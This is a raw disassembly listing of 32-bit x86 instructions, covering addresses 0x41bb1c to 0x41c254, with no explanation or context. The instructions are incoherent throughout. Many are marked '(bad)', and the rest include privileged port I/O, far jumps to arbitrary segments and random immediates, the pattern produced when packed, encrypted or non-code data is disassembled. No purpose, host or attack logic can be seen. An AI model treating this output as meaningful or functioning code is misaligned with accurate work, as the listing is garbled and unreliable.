  41bb1c:	adc    BYTE PTR [edi+0x4f],dh
  41bb1f:	and    eax,0x399c7319
  41bb24:	adc    ecx,DWORD PTR [esi+0x1c13108c]
  41bb2a:	fwait
  41bb2b:	mov    ah,0xdd
  41bb2d:	pop    ecx
  41bb2e:	iret   
  41bb2f:	push   esp
  41bb30:	imul   edi,ecx,0x78
  41bb33:	dec    esi
  41bb34:	sbb    al,0xd2
  41bb36:	bound  esp,QWORD PTR [edx]
  41bb38:	push   esp
  41bb39:	mov    ds:0xac015aee,al
  41bb3e:	lahf   
  41bb3f:	and    DWORD PTR [edx-0x5d46c732],eax
  41bb45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb46:	and    ecx,DWORD PTR [edi+0x1f6747a7]
  41bb4c:	les    edi,FWORD PTR [ecx]
  41bb4e:	push   esi
  41bb4f:	jno    0x41bb13
  41bb51:	adc    BYTE PTR [esi+ecx*4+0x5c],0x88
  41bb56:	(bad)  
  41bb58:	sub    al,BYTE PTR [ebx]
  41bb5a:	data16 and BYTE PTR [esi],ch
  41bb5d:	or     DWORD PTR [ebx-0x527ce7b0],edi
  41bb63:	test   eax,0x5a6e57c7
  41bb68:	add    dl,BYTE PTR [esi]
  41bb6a:	in     eax,dx
  41bb6b:	sahf   
  41bb6c:	sub    al,0x35
  41bb6e:	or     al,0x88
  41bb70:	push   edi
  41bb71:	mov    WORD PTR [edx+edx*1],gs
  41bb74:	pop    ecx
  41bb75:	ficom  WORD PTR [ebx-0x73dc38d9]
  41bb7b:	pop    esp
  41bb7c:	adc    eax,0x41742857
  41bb81:	enter  0xbab2,0xcf
  41bb85:	popa   
  41bb86:	test   eax,0x641dd273
  41bb8b:	jl     0x41bba5
  41bb8d:	(bad)  
  41bb8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb8f:	aad    0x38
  41bb91:	mov    al,0x5c
  41bb93:	inc    ebp
  41bb94:	int    0xce
  41bb96:	fldcw  WORD PTR [ebp-0x3843c123]
  41bb9c:	xor    BYTE PTR [esi+0x10b3313a],bl
  41bba2:	jno    0x41bc13
  41bba4:	push   ecx
  41bba5:	sub    ah,bh
  41bba7:	std    
  41bba8:	shl    DWORD PTR [eax],cl
  41bbaa:	int    0xfe
  41bbac:	adc    eax,0xd42f18f8
  41bbb1:	adc    DWORD PTR [ebx-0x25],edi
  41bbb4:	pop    ecx
  41bbb5:	nop
  41bbb6:	push   ecx
  41bbb7:	add    ebx,edi
  41bbb9:	sub    al,0x91
  41bbbb:	lods   eax,DWORD PTR ds:[esi]
  41bbbc:	sbb    BYTE PTR [ebx+edx*1+0x3f],al
  41bbc0:	(bad)  
  41bbc1:	pop    edi
  41bbc2:	push   esp
  41bbc3:	dec    ecx
  41bbc4:	stos   DWORD PTR es:[edi],eax
  41bbc5:	les    esi,FWORD PTR [ebx-0x66]
  41bbc8:	add    BYTE PTR [ebx-0x5d81d8ae],dh
  41bbce:	mov    ss,WORD PTR [ebp+0x30036fc1]
  41bbd4:	adc    al,0x58
  41bbd6:	repnz (bad) 
  41bbd8:	jns    0x41bb9b
  41bbda:	mov    ch,0x20
  41bbdc:	fistp  WORD PTR [ebx-0x1e]
  41bbdf:	or     DWORD PTR [ebp-0x138d7352],ebx
  41bbe5:	jmp    0xb38d:0x7c296772
  41bbec:	mov    eax,0x3de76f46
  41bbf1:	stos   DWORD PTR es:[edi],eax
  41bbf2:	push   ecx
  41bbf3:	js     0x41bc47
  41bbf5:	bound  esi,QWORD PTR [esi]
  41bbf7:	dec    esp
  41bbf8:	mov    edx,0xf5655ffe
  41bbfd:	xchg   esp,eax
  41bbfe:	adc    dh,BYTE PTR [esi+0x65]
  41bc01:	jno    0x41bbe4
  41bc03:	cs mov edx,0xd6500dc8
  41bc09:	imul   esi,DWORD PTR [ecx],0x4a
  41bc0c:	or     al,0xe8
  41bc0e:	add    cl,BYTE PTR [edx]
  41bc10:	in     eax,dx
  41bc11:	call   0x46cc1abe
  41bc16:	xor    esi,DWORD PTR [ebx+ebp*8+0x62c6b850]
  41bc1d:	and    al,0xe5
  41bc1f:	xchg   DWORD PTR [edx+ecx*2-0x7b07115e],ecx
  41bc26:	iret   
  41bc27:	stos   DWORD PTR es:[edi],eax
  41bc28:	mov    dl,0xc5
  41bc2a:	(bad)  
  41bc2b:	es enter 0x76d5,0x17
  41bc30:	mov    edx,0x423786c1
  41bc35:	mov    bh,BYTE PTR [eax]
  41bc37:	aaa    
  41bc38:	repnz das 
  41bc3a:	jno    0x41bbe9
  41bc3c:	pop    ecx
  41bc3d:	jo     0x41bc91
  41bc3f:	gs and al,0xea
  41bc42:	xor    cl,ch
  41bc44:	xor    dh,dh
  41bc46:	pop    esp
  41bc47:	sahf   
  41bc48:	mov    ebp,0x136653b4
  41bc4d:	cmp    al,0x5d
  41bc4f:	add    al,0x8f
  41bc51:	xchg   BYTE PTR [edi],ah
  41bc53:	or     eax,0x27774bf4
  41bc58:	clc    
  41bc59:	adc    DWORD PTR [edx-0x72],ecx
  41bc5c:	adc    eax,0x90b9bed4
  41bc61:	sbb    BYTE PTR [edx-0x358fdedf],bl
  41bc67:	push   DWORD PTR [eax+edx*8-0x41]
  41bc6b:	bswap  ecx
  41bc6d:	pop    ds
  41bc6e:	dec    edi
  41bc6f:	jmp    0xcdc3949a
  41bc74:	retf   0xcce2
  41bc77:	shl    DWORD PTR [ecx+0x533e118a],cl
  41bc7d:	retf   0xc453
  41bc80:	test   esp,ebx
  41bc82:	repnz sbb al,bl
  41bc85:	fnstenv [esi+0x760eae54]
  41bc8b:	add    bl,BYTE PTR [eax+0x278bb56f]
  41bc91:	jnp    0x41bce2
  41bc93:	and    edx,esi
  41bc95:	and    dh,BYTE PTR [ebp+esi*2-0x15]
  41bc99:	mov    edi,0xa220aea9
  41bc9e:	pop    edi
  41bc9f:	xchg   ecx,eax
  41bca0:	add    edx,esp
  41bca2:	retf   
  41bca3:	cli    
  41bca4:	clc    
  41bca5:	in     eax,dx
  41bca6:	pusha  
  41bca7:	xlat   BYTE PTR ds:[ebx]
  41bca8:	mov    bl,BYTE PTR [ecx]
  41bcaa:	push   esp
  41bcab:	outs   dx,BYTE PTR ds:[esi]
  41bcac:	ss jp  0x41bce7
  41bcaf:	jecxz  0x41bc41
  41bcb1:	jns    0x41bd03
  41bcb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcb4:	dec    ebx
  41bcb5:	add    DWORD PTR [esi-0x2],esp
  41bcb8:	mov    ss,WORD PTR [edx]
  41bcba:	and    cl,BYTE PTR [ebx]
  41bcbc:	jle    0x41bc3e
  41bcbe:	into   
  41bcbf:	xor    BYTE PTR [ebx-0xf],dl
  41bcc2:	ins    BYTE PTR es:[edi],dx
  41bcc3:	jno    0x41bc70
  41bcc5:	cld    
  41bcc6:	mov    ecx,0x4f46ef66
  41bccb:	jne    0x41bcab
  41bccd:	push   esp
  41bcce:	icebp  
  41bccf:	and    eax,DWORD PTR [edi-0x1]
  41bcd2:	sbb    cl,bl
  41bcd4:	sahf   
  41bcd5:	(bad)  
  41bcd6:	push   ebp
  41bcd7:	mov    WORD PTR [edi-0x7605b43a],gs
  41bcdd:	pusha  
  41bcde:	shl    BYTE PTR [ebp+0x3b81a072],0xe
  41bce5:	ds scas eax,DWORD PTR es:[edi]
  41bce7:	shl    DWORD PTR [esi-0x18],cl
  41bcea:	int3   
  41bceb:	imul   edi,DWORD PTR [ebp+0x35724e72],0xffffff8b
  41bcf2:	jmp    0x981:0xaf5fd036
  41bcf9:	(bad)  
  41bcfa:	mov    ebp,0x1279e3e3
  41bcff:	push   eax
  41bd00:	dec    esp
  41bd01:	das    
  41bd02:	cmp    esp,DWORD PTR [ebx]
  41bd04:	push   ebp
  41bd05:	mov    al,0x5b
  41bd07:	cmp    ch,BYTE PTR [edx+0x352f0acf]
  41bd0d:	mov    ds:0x8c625a32,al
  41bd12:	dec    ebx
  41bd13:	pop    ds
  41bd14:	lods   eax,DWORD PTR ds:[esi]
  41bd15:	fwait
  41bd16:	adc    esi,DWORD PTR [ecx-0x40]
  41bd19:	sar    BYTE PTR [edx],cl
  41bd1b:	ficomp DWORD PTR [edx+0x18]
  41bd1e:	pop    edx
  41bd1f:	push   0xb93ae59d
  41bd24:	(bad)  
  41bd25:	pop    ds
  41bd26:	cmp    al,0x96
  41bd28:	mov    al,ds:0xb885366d
  41bd2e:	pop    ds
  41bd2f:	popf   
  41bd30:	push   edx
  41bd31:	test   al,0x2
  41bd33:	lods   eax,DWORD PTR ds:[esi]
  41bd34:	jns    0x41bcf9
  41bd36:	lods   eax,DWORD PTR es:[esi]
  41bd38:	sub    al,0x3b
  41bd3a:	dec    ecx
  41bd3b:	into   
  41bd3c:	mov    ah,0x7b
  41bd3e:	mov    al,ds:0xa0fcd99d
  41bd43:	push   ds
  41bd44:	cwde   
  41bd45:	cdq    
  41bd46:	cs pop esp
  41bd48:	fstp   st(1)
  41bd4a:	sbb    al,0xb7
  41bd4c:	jmp    0xb167:0x39febb64
  41bd53:	idiv   BYTE PTR [ebx]
  41bd55:	sbb    bh,cl
  41bd57:	jg     0x41bdcd
  41bd59:	inc    ebx
  41bd5a:	jecxz  0x41bd0a
  41bd5c:	pop    ss
  41bd5d:	inc    edi
  41bd5e:	mov    eax,0x8f62ab6b
  41bd63:	xchg   edi,esp
  41bd65:	cmc    
  41bd66:	popf   
  41bd67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd68:	loopne 0x41bdb8
  41bd6a:	mov    ch,0x1b
  41bd6c:	cmp    dl,BYTE PTR [eax+ebp*2]
  41bd6f:	xor    al,0xeb
  41bd71:	pop    ebp
  41bd72:	in     eax,0xcb
  41bd74:	or     eax,0xe8b2d65c
  41bd79:	iret   
  41bd7a:	adc    DWORD PTR [esi+0x5ef6dbb4],ebx
  41bd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd81:	fsub   DWORD PTR [ecx+0x6096572d]
  41bd87:	inc    ebx
  41bd88:	pop    ss
  41bd89:	popa   
  41bd8a:	daa    
  41bd8b:	jne    0x88de63c9
  41bd91:	jae    0x41bd8b
  41bd93:	add    al,0x52
  41bd95:	cmp    dl,BYTE PTR [edi+0x6d]
  41bd98:	test   DWORD PTR [ecx],0xececbe92
  41bd9e:	fadd   st,st(0)
  41bda0:	outs   dx,DWORD PTR ds:[esi]
  41bda1:	clc    
  41bda2:	out    0xc3,eax
  41bda4:	es pop ds
  41bda6:	push   0x741e0107
  41bdab:	iret   
  41bdac:	add    bh,dh
  41bdae:	add    ch,BYTE PTR [ebp+0x46]
  41bdb1:	push   eax
  41bdb2:	popa   
  41bdb3:	jg     0x41bd75
  41bdb5:	mov    al,BYTE PTR [ecx-0x2f555fb5]
  41bdbb:	mov    ebp,DWORD PTR [eax-0x5ae83c02]
  41bdc1:	pop    ds
  41bdc2:	sahf   
  41bdc3:	cld    
  41bdc4:	arpl   si,cx
  41bdc6:	add    al,BYTE PTR [esi+eiz*1]
  41bdc9:	mov    bh,BYTE PTR [ebx+ebx*8]
  41bdcc:	dec    esi
  41bdcd:	or     al,0xbd
  41bdcf:	or     ah,BYTE PTR [edx+0x30]
  41bdd2:	xor    cl,bh
  41bdd4:	jmp    edx
  41bdd6:	js     0x41bda4
  41bdd8:	add    cl,BYTE PTR [ebx+0x44003790]
  41bdde:	bound  eax,QWORD PTR [ebx]
  41bde0:	jns    0x41be60
  41bde2:	cmp    bl,bl
  41bde4:	mov    bl,0x9b
  41bde6:	jo     0x41bdd8
  41bde8:	sbb    ch,cl
  41bdea:	mov    ch,0xce
  41bdec:	scas   eax,DWORD PTR es:[edi]
  41bded:	add    DWORD PTR [edi+ecx*8],edi
  41bdf0:	mov    dl,0x73
  41bdf2:	pop    eax
  41bdf3:	add    eax,0xc3ab5607
  41bdf8:	imul   BYTE PTR ds:0x3a17d47e
  41bdfe:	mov    ds:0x652e0ac5,al
  41be03:	fscale 
  41be05:	jno    0x41bdbe
  41be07:	xor    DWORD PTR [eax],ecx
  41be09:	xchg   edx,eax
  41be0a:	sub    DWORD PTR ds:0xdbb10f05,ebp
  41be10:	cmp    edi,edi
  41be12:	mov    ebp,esp
  41be14:	mov    cl,dh
  41be16:	xor    DWORD PTR [eax+eax*8],ecx
  41be19:	icebp  
  41be1a:	dec    edx
  41be1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be1c:	inc    eax
  41be1d:	pop    ebx
  41be1e:	dec    esp
  41be1f:	adc    DWORD PTR [ebp-0x18],esi
  41be22:	sub    eax,0x33146aae
  41be27:	and    bl,ah
  41be29:	imul   ebx,DWORD PTR [edi+0x28],0x1b
  41be2d:	xrelease xchg BYTE PTR [edi-0x3ec8788f],bh
  41be34:	idiv   esp
  41be36:	xchg   ecx,eax
  41be37:	sub    dl,BYTE PTR [eax-0x372c51a1]
  41be3d:	mov    ds:0x4367589c,eax
  41be42:	push   ebp
  41be43:	lods   eax,DWORD PTR ds:[esi]
  41be44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be45:	and    al,0x82
  41be47:	cmc    
  41be48:	es cs jg 0x41be2a
  41be4c:	xchg   BYTE PTR [edi],dl
  41be4e:	jno    0x41be8c
  41be50:	out    0x6c,al
  41be52:	cmp    al,0x9c
  41be54:	xchg   ecx,eax
  41be55:	cmp    DWORD PTR [edx],ebx
  41be57:	pop    ss
  41be58:	mov    dl,0x5a
  41be5a:	je     0x41be34
  41be5c:	and    al,BYTE PTR [eax+0x64528c49]
  41be62:	push   ebx
  41be63:	push   ebx
  41be64:	stos   BYTE PTR es:[edi],al
  41be65:	push   eax
  41be66:	(bad)  
  41be67:	gs ins BYTE PTR es:[edi],dx
  41be69:	sub    eax,0x9eba05d5
  41be6e:	or     al,0xa9
  41be70:	(bad)  
  41be71:	(bad)  
  41be72:	(bad)  
  41be74:	mov    esi,0x19f6e499
  41be79:	push   es
  41be7a:	mov    eax,0xa5d045
  41be7f:	add    DWORD PTR [ecx-0x76],edx
  41be82:	mov    bl,BYTE PTR [ecx]
  41be84:	cmp    edx,DWORD PTR [ebx+0x5]
  41be87:	add    eax,DWORD PTR [edi]
  41be89:	jb     0x41be64
  41be8b:	xchg   esi,eax
  41be8c:	push   ecx
  41be8d:	mov    ch,BYTE PTR [eax]
  41be8f:	sti    
  41be90:	xor    al,0x57
  41be92:	and    cl,cl
  41be94:	xor    DWORD PTR fs:[eax],ebp
  41be97:	dec    edi
  41be98:	ret    0xaf4a
  41be9b:	mov    cl,0xa6
  41be9d:	push   edx
  41be9e:	inc    ebx
  41be9f:	bound  esp,QWORD PTR [ecx-0x1984d4ce]
  41bea5:	cmp    al,0x3b
  41bea7:	sub    edx,DWORD PTR [ecx+0x32]
  41beaa:	cs cmc 
  41beac:	and    al,0xef
  41beaf:	and    BYTE PTR [edi],ah
  41beb1:	popa   
  41beb2:	(bad)  
  41beb4:	icebp  
  41beb5:	out    0xbc,eax
  41beb7:	(bad)  ds:0xf8c989b0
  41bebd:	xor    ah,bl
  41bebf:	mov    esp,0x3aba88c1
  41bec4:	frstor [ecx+edi*1]
  41bec7:	cmp    dl,BYTE PTR [edx]
  41bec9:	xchg   DWORD PTR [ebx-0x7a5ce935],esp
  41becf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bed0:	fistp  QWORD PTR ds:0xb8d3507a
  41bed6:	jge    0x41bec9
  41bed8:	sub    eax,0xb35381e3
  41bedd:	xor    al,0x6c
  41bedf:	sbb    cl,0x78
  41bee2:	aad    0x1
  41bee4:	mov    DWORD PTR [edi+0x3e],ebp
  41bee7:	cld    
  41bee8:	push   ecx
  41bee9:	arpl   di,si
  41beeb:	in     eax,dx
  41beec:	les    edx,FWORD PTR [edx+eiz*2-0x44]
  41bef0:	pop    DWORD PTR [ebp-0x16]
  41bef3:	js     0x41bf64
  41bef5:	add    BYTE PTR [eax-0x13],cl
  41bef8:	enter  0x636a,0x21
  41befc:	and    eax,0x2f77e724
  41bf01:	sub    esi,esp
  41bf03:	xchg   ebp,eax
  41bf04:	pushf  
  41bf05:	aas    
  41bf06:	fnstenv [eax]
  41bf08:	adc    DWORD PTR [eax+ecx*2],ebp
  41bf0b:	jecxz  0x41bf20
  41bf0d:	dec    esp
  41bf0e:	pop    eax
  41bf0f:	test   al,0x59
  41bf11:	jg     0x41bee8
  41bf13:	sbb    ebp,DWORD PTR [esi+ebp*4]
  41bf16:	outs   dx,DWORD PTR ds:[esi]
  41bf17:	and    esp,ebp
  41bf19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf1a:	mov    ah,BYTE PTR [ebp-0x10]
  41bf1d:	xor    ebx,DWORD PTR [esi-0x56]
  41bf20:	pop    ebp
  41bf21:	aaa    
  41bf22:	das    
  41bf23:	cmp    al,0xed
  41bf25:	int3   
  41bf26:	call   0x9ccf759e
  41bf2b:	popa   
  41bf2c:	hlt    
  41bf2d:	shl    DWORD PTR [eax],1
  41bf2f:	sbb    al,0xd3
  41bf31:	push   es
  41bf32:	mov    cl,0xc1
  41bf34:	(bad)
  41bf38:	dec    edx
  41bf39:	retf   
  41bf3a:	pop    ss
  41bf3b:	mov    DWORD PTR [edx+edx*2],edi
  41bf3e:	sbb    ecx,DWORD PTR [edx-0x5ca32e46]
  41bf44:	lahf   
  41bf45:	push   eax
  41bf46:	jmp    0x41bf35
  41bf48:	or     dh,al
  41bf4a:	adc    al,0xc5
  41bf4c:	and    eax,0x14038fd2
  41bf51:	mov    esp,DWORD PTR [eax]
  41bf53:	rcl    BYTE PTR [edi+0x7b5a9e30],cl
  41bf59:	pop    ebp
  41bf5a:	sbb    eax,DWORD PTR [edi-0x636c7349]
  41bf60:	adc    ecx,0x41
  41bf63:	iret   
  41bf64:	or     ah,al
  41bf66:	jp     0x41bfaa
  41bf68:	jmp    0xed25:0x2444087f
  41bf6f:	mov    ?,WORD PTR [edi-0x121f8865]
  41bf75:	pop    esp
  41bf76:	cli    
  41bf77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf78:	pushf  
  41bf79:	dec    esp
  41bf7a:	outs   dx,DWORD PTR ds:[esi]
  41bf7b:	add    DWORD PTR [edx],edi
  41bf7d:	or     BYTE PTR [ecx+0x21],0xa8
  41bf81:	jb     0x41bf3b
  41bf83:	enter  0x14a,0xc3
  41bf87:	aas    
  41bf88:	dec    edi
  41bf89:	ins    BYTE PTR es:[edi],dx
  41bf8a:	std    
  41bf8b:	cwde   
  41bf8c:	int    0xc6
  41bf8e:	push   ebp
  41bf8f:	frstor [edx-0x6b2da215]
  41bf95:	(bad)  
  41bf96:	cmc    
  41bf97:	or     BYTE PTR [ebx],ch
  41bf99:	rcl    BYTE PTR [edi+0x2b],cl
  41bf9c:	aaa    
  41bf9d:	loop   0x41c000
  41bf9f:	sbb    al,0x47
  41bfa1:	sub    DWORD PTR [ecx-0x7f],edx
  41bfa4:	out    dx,eax
  41bfa5:	add    BYTE PTR [ecx],bl
  41bfa7:	sub    eax,0x81bb9929
  41bfac:	cmp    al,0x4a
  41bfae:	or     esp,DWORD PTR [eax-0x3f67af71]
  41bfb4:	pop    ss
  41bfb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfb6:	or     DWORD PTR [edx+0x16],eax
  41bfb9:	sub    edi,esp
  41bfbb:	mov    ecx,0x23e90bbd
  41bfc0:	xor    ah,ah
  41bfc2:	xchg   edx,eax
  41bfc3:	adc    bl,0x47
  41bfc6:	outs   dx,DWORD PTR ds:[esi]
  41bfc7:	push   ebx
  41bfc8:	xor    BYTE PTR [esp+ecx*4-0x73b82ecc],dh
  41bfcf:	lea    ebx,[edx-0x66]
  41bfd2:	loope  0x41bfe1
  41bfd4:	icebp  
  41bfd5:	push   0xffffffb2
  41bfd7:	sbb    dl,BYTE PTR [ebp+0x14]
  41bfda:	push   di
  41bfdc:	sub    DWORD PTR [edx-0x63],ebx
  41bfdf:	push   es
  41bfe0:	into   
  41bfe1:	push   esp
  41bfe2:	mov    ds:0x8b0d2bf1,eax
  41bfe7:	outs   dx,DWORD PTR ds:[esi]
  41bfe8:	fld    TBYTE PTR ds:0xf5bd98ea
  41bfee:	xor    BYTE PTR [edx-0x2c3338fc],al
  41bff4:	and    DWORD PTR [eax],esp
  41bff6:	dec    eax
  41bff7:	repz cli 
  41bff9:	jmp    0x4a58ed6b
  41bffe:	jmp    0x407fc4ee
  41c003:	or     DWORD PTR ds:0x96bb29fa,edi
  41c009:	pop    ebp
  41c00a:	icebp  
  41c00b:	shl    dh,0xe3
  41c00e:	cwde   
  41c00f:	stos   DWORD PTR es:[edi],eax
  41c010:	gs into 
  41c012:	and    BYTE PTR [edi+edx*4-0x5417ad09],dl
  41c019:	sub    DWORD PTR [edx+0x42],0x6e
  41c01d:	mov    esp,0x261f09
  41c022:	in     eax,0x90
  41c024:	ds push edi
  41c026:	(bad)  
  41c027:	stos   BYTE PTR es:[edi],al
  41c028:	jnp    0x41c03a
  41c02a:	out    dx,al
  41c02b:	sbb    eax,DWORD PTR [edx+0x4a]
  41c02e:	data16 mov bh,0x48
  41c031:	jmp    0x41bff7
  41c033:	dec    ebp
  41c034:	jle    0x41c02d
  41c036:	loop   0x41c00f
  41c038:	pop    esp
  41c039:	jmp    0x9b30d88a
  41c03e:	or     BYTE PTR [ecx],0x96
  41c041:	push   0x7ca44e5
  41c046:	fnsave [esi-0x54]
  41c049:	(bad)  
  41c04b:	mov    ch,0x8f
  41c04d:	sub    eax,0x1fec1250
  41c052:	dec    ebx
  41c053:	fdivr  DWORD PTR [edi]
  41c055:	dec    ebx
  41c056:	pop    ds
  41c057:	imul   ebp,edx,0x24ef1ed6
  41c05d:	enter  0x95e5,0x26
  41c061:	sti    
  41c062:	stc    
  41c063:	retf   0x139e
  41c066:	in     al,dx
  41c067:	retf   
  41c068:	cmc    
  41c069:	inc    esi
  41c06a:	inc    edx
  41c06b:	std    
  41c06c:	dec    esi
  41c06d:	mov    edi,0x2e06ace0
  41c072:	xor    al,0x4b
  41c074:	fld    QWORD PTR [edi-0x70]
  41c077:	mov    ebp,0xff1fde5c
  41c07c:	stc    
  41c07d:	or     DWORD PTR ds:0xb2b3e1ef,edi
  41c083:	(bad)  
  41c085:	dec    ecx
  41c086:	ret    
  41c087:	push   ecx
  41c088:	stc    
  41c089:	or     DWORD PTR [ebp+0x56],0xffffff81
  41c08d:	pop    es
  41c08e:	ds imul ecx,ebp,0xffffffa7
  41c092:	lds    ebp,FWORD PTR [edi]
  41c094:	in     eax,dx
  41c095:	popf   
  41c096:	xchg   ecx,eax
  41c097:	or     ch,dl
  41c099:	stos   BYTE PTR es:[edi],al
  41c09a:	int3   
  41c09b:	sub    eax,DWORD PTR [edx+0xb7d2f87]
  41c0a1:	pop    ecx
  41c0a2:	mov    bh,0xb1
  41c0a4:	pushf  
  41c0a5:	aaa    
  41c0a6:	xor    BYTE PTR [ecx+0x2b],dh
  41c0a9:	sub    BYTE PTR [ebp-0x65],0x5e
  41c0ad:	inc    ebp
  41c0ae:	enter  0xa009,0xe
  41c0b2:	(bad)  
  41c0b3:	mov    ecx,0x46f8bd9b
  41c0b8:	xor    ch,BYTE PTR [edx-0x7e]
  41c0bb:	inc    ecx
  41c0bc:	aaa    
  41c0bd:	dec    edx
  41c0be:	xchg   DWORD PTR [eax],edx
  41c0c0:	fidivr DWORD PTR [ecx-0x2244a95d]
  41c0c6:	ror    DWORD PTR [ebp-0x37],1
  41c0c9:	mov    eax,0x786f64f4
  41c0ce:	dec    edx
  41c0cf:	cli    
  41c0d0:	aaa    
  41c0d1:	push   ebp
  41c0d2:	emms   
  41c0d4:	cmp    DWORD PTR [ecx+ebp*2+0x7],esp
  41c0d8:	push   es
  41c0d9:	aas    
  41c0da:	cs xchg edx,eax
  41c0dc:	add    BYTE PTR [ecx],ah
  41c0de:	mov    ds:0x7d65fcbf,al
  41c0e3:	mov    esi,0x4fd0baf
  41c0e8:	fcomp  DWORD PTR [ebx+0x6d9efc8d]
  41c0ee:	fimul  WORD PTR [ecx+0x14]
  41c0f1:	cmp    BYTE PTR [edx-0x5f],0xaf
  41c0f5:	(bad)  
  41c0f6:	pop    edi
  41c0f7:	call   0x63f28e5b
  41c0fc:	and    eax,0xda0dd5cf
  41c101:	gs pop ecx
  41c103:	and    al,bh
  41c105:	xchg   ebx,eax
  41c106:	test   eax,0x460b7148
  41c10b:	add    BYTE PTR [eax],bh
  41c10d:	jno    0x41c167
  41c10f:	aas    
  41c110:	push   ebx
  41c111:	jg     0x41c103
  41c113:	outs   dx,DWORD PTR ds:[esi]
  41c114:	iret   
  41c115:	int    0xdc
  41c117:	ror    DWORD PTR [esi+0x72cd2bf1],1
  41c11d:	sbb    al,0x73
  41c11f:	mov    ?,WORD PTR [esi+0x74]
  41c122:	fcmove st,st(1)
  41c124:	push   0xf543ba12
  41c129:	lods   eax,DWORD PTR ds:[esi]
  41c12a:	and    edi,DWORD PTR [eax+0x52]
  41c12d:	std    
  41c12e:	cmp    BYTE PTR [ecx],cl
  41c130:	mov    edx,0xefb33d0a
  41c135:	sbb    dl,BYTE PTR [ebx]
  41c137:	out    dx,eax
  41c138:	es fdivrp st(5),st
  41c13b:	and    BYTE PTR [eax],al
  41c13d:	cdq    
  41c13e:	cmc    
  41c13f:	adc    al,dl
  41c141:	xor    eax,0xe9452548
  41c146:	(bad)  
  41c147:	push   esi
  41c148:	adc    ah,dl
  41c14a:	loop   0x41c136
  41c14c:	or     dl,dh
  41c14e:	int3   
  41c14f:	jmp    0xe31eb8f8
  41c154:	aad    0x26
  41c156:	cld    
  41c157:	icebp  
  41c158:	or     al,0x8
  41c15a:	jo     0x41c140
  41c15c:	loopne 0x41c17c
  41c15e:	clc    
  41c15f:	jne    0x41c112
  41c161:	add    eax,ecx
  41c163:	mov    ebx,0xc989aa17
  41c168:	pop    esi
  41c169:	scas   eax,DWORD PTR es:[edi]
  41c16a:	into   
  41c16b:	cmc    
  41c16c:	jge    0x41c1b7
  41c16e:	xchg   ecx,eax
  41c16f:	(bad)
  41c174:	cmc    
  41c175:	push   eax
  41c176:	cld    
  41c177:	rcr    edi,1
  41c179:	repz test DWORD PTR gs:[ebx+edi*2],0xdb76fe52
  41c182:	xchg   esi,eax
  41c183:	jb     0x41c11e
  41c185:	pop    eax
  41c186:	lock push ecx
  41c188:	push   es
  41c189:	mov    dl,BYTE PTR [eax+0x13ac56ce]
  41c18f:	ss add bh,cl
  41c192:	fsubr  QWORD PTR [eax]
  41c194:	retf   
  41c195:	xchg   DWORD PTR [edx+ebx*1-0x5273dc81],ebp
  41c19c:	lods   eax,DWORD PTR ds:[esi]
  41c19d:	dec    ecx
  41c19e:	ss jns 0x41c1b4
  41c1a1:	lock rcl DWORD PTR [eax+0x44208a40],cl
  41c1a8:	nop
  41c1a9:	and    BYTE PTR [ebx-0x2285ce9f],dl
  41c1af:	mov    esi,?
  41c1b1:	push   edx
  41c1b2:	mov    eax,0xb7a7b7ff
  41c1b7:	jmp    0x7ae8a559
  41c1bc:	retf   
  41c1bd:	fld    DWORD PTR [edx]
  41c1bf:	xor    esi,ebp
  41c1c1:	in     eax,dx
  41c1c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1c3:	push   ss
  41c1c4:	or     BYTE PTR [esp+ebp*1-0x6c],0x78
  41c1c9:	jl     0x41c18f
  41c1cb:	ret    0x96fa
  41c1ce:	inc    esp
  41c1cf:	pop    esp
  41c1d0:	jle    0x41c1ba
  41c1d2:	cli    
  41c1d3:	cmp    DWORD PTR [ebp+0x9],esi
  41c1d6:	sti    
  41c1d7:	ins    DWORD PTR es:[edi],dx
  41c1d8:	adc    al,0xd5
  41c1da:	test   eax,0x6f570da
  41c1df:	les    esi,FWORD PTR [ecx-0x1c]
  41c1e2:	ss mov dl,0x97
  41c1e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1e6:	sti    
  41c1e7:	cmp    eax,0x448e7e00
  41c1ec:	xchg   DWORD PTR [ecx+ecx*8+0x8fd6936],eax
  41c1f3:	leave  
  41c1f4:	xor    BYTE PTR [eax+0x24],ah
  41c1f7:	into   
  41c1f8:	(bad)  
  41c1f9:	jns    0x41c1cd
  41c1fb:	sar    DWORD PTR [edx],0x5a
  41c1fe:	mov    bh,0xf3
  41c200:	test   DWORD PTR [ecx-0x14],esp
  41c203:	aad    0x58
  41c205:	rcr    DWORD PTR [eax+0x12a4cbf],0xb2
  41c20c:	jmp    0x25955a1b
  41c211:	mov    di,0x8608
  41c215:	push   esp
  41c216:	cwde   
  41c217:	cwde   
  41c218:	dec    esi
  41c219:	push   es
  41c21a:	xlat   BYTE PTR ds:[ebx]
  41c21b:	(bad)  
  41c21c:	or     DWORD PTR [esi+0x231fde4e],0x4c
  41c223:	mov    bh,0xbd
  41c225:	lahf   
  41c226:	jl     0x41c1c8
  41c228:	imul   edi,edi,0x200d2fbe
  41c22e:	xchg   ecx,eax
  41c22f:	das    
  41c230:	dec    edx
  41c231:	jo     0x41c221
  41c233:	(bad)  
  41c234:	mov    dl,0x13
  41c236:	inc    edx
  41c237:	jae    0x41c1be
  41c239:	cmp    BYTE PTR [ebp-0x16],al
  41c23c:	jge    0x41c297
  41c23e:	stos   DWORD PTR es:[edi],eax
  41c23f:	pushf  
  41c240:	dec    eax
  41c241:	jmp    0x41c267
  41c243:	arpl   si,sp
  41c245:	mov    esi,ebx
  41c247:	xor    BYTE PTR [eax+edi*1+0x5c],bl
  41c24b:	ficomp WORD PTR ds:0x94ee4c53
  41c251:	sbb    DWORD PTR [ecx-0x2a],ebx
  41c254:	and    eax,0xf2918f52
